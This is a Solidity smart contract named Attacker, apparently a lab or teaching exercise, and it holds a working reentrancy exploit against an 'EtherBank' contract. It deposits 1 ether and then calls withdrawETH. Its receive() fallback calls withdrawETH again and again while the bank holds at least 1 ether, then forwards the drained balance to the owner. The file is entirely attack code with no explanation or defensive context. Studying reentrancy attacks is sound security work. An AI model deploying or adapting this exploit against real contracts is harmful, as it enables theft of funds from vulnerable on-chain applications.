// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

interface IEtherBank {
    function depositETH() external payable;
    function withdrawETH() external;
}
// import {EtherBank} from "./EtherBank.sol";

contract Attacker {
    // IEtherBank bank;
    IEtherBank bank;
    address owner;

    constructor(address _target) payable {
        bank = IEtherBank(_target);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only Owner can call this function");
        bank.depositETH{value: 1 ether}();
        bank.withdrawETH();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawETH();
        } else {
            (bool sent,) = owner.call{value: address(this).balance}("");
            require(sent, "Transfer Failed");
        }
    }
}
